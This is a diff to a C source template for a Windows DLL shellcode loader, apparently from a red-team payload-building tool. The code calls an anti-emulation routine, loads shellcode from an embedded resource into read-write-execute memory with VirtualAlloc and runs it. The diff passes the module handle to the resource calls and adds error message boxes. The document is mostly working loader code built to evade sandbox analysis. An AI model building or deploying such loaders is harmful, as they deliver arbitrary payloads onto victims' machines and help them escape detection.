@@ -3,6 +3,8 @@
 
 #define IDR_SHELLCODE 101
 
+// Global variable to store the DLL module handle
+static HMODULE g_hModule = NULL;
 
 // https://github.com/dobin/SuperMega/blob/main/data/source/antiemulation/timeraw.c
 int get_time_raw() {
@@ -48,6 +50,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+        g_hModule = hModule;  // Save the DLL module handle
+        break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
@@ -57,41 +61,46 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 }
 
 // Exported function
-__declspec(dllexport) int process(void)
+__declspec(dllexport) void process(void)
 {
 	DWORD result;
 	{{SHELLCODE}}
 
     antiemulation();
-
+	
 	// Find the shellcode resource
-	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SHELLCODE), RT_RCDATA);
+	HRSRC hRes = FindResource(g_hModule, MAKEINTRESOURCE(IDR_SHELLCODE), RT_RCDATA);
 	if (hRes == NULL) {
-		return 1;
+		MessageBoxA(NULL, "FindResource failed", "Error", MB_OK | MB_ICONERROR);
+		return;
 	}
 
 	// Get the size of the resource
-	DWORD shellcode_size = SizeofResource(NULL, hRes);
+	DWORD shellcode_size = SizeofResource(g_hModule, hRes);
 	if (shellcode_size == 0) {
-		return 2;
+		MessageBoxA(NULL, "SizeofResource failed", "Error", MB_OK | MB_ICONERROR);
+		return;
 	}
 
 	// Load the resource
-	HGLOBAL hResLoad = LoadResource(NULL, hRes);
+	HGLOBAL hResLoad = LoadResource(g_hModule, hRes);
 	if (hResLoad == NULL) {
-		return 3;
+		MessageBoxA(NULL, "LoadResource failed", "Error", MB_OK | MB_ICONERROR);
+		return;
 	}
 
 	// Lock the resource to get a pointer to its data
 	LPVOID pResData = LockResource(hResLoad);
 	if (pResData == NULL) {
-		return 4;
+		MessageBoxA(NULL, "LockResource failed", "Error", MB_OK | MB_ICONERROR);
+		return;
 	}
 
 	// Allocate memory for the shellcode RW
     char *dest = VirtualAlloc(NULL, shellcode_size, 0x3000, PAGE_EXECUTE_READWRITE);
 	if (dest == NULL) {
-		return 5;
+		MessageBoxA(NULL, "VirtualAlloc failed", "Error", MB_OK | MB_ICONERROR);
+		return;
 	}
 
 	// Copy the shellcode from resource to the allocated memory
@@ -102,6 +111,4 @@ __declspec(dllexport) int process(void)
 
     // Execute *dest
     (*(void(*)())(dest))();
-	
-	return 0;
 }
